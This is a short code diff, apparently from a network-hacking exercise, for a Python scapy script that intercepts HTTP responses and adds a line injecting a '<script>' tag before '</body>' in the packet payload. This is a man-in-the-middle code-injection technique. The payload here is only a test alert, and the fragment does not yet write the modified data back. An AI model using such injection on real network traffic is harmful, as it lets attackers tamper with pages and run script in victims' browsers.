@@ -26,7 +26,8 @@ def process_packet(packet):
 #check packets source port for 80 (http) RESPONSES
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(scapy_packet.show())
+#in the captured packet replace the body in the load field with a script
+            modified_load = scapy_packet[scapy.Raw].load.replace("</body>", "<script>alert('test');</script></body>")
     packet.accept()
 
 #create instance of queue
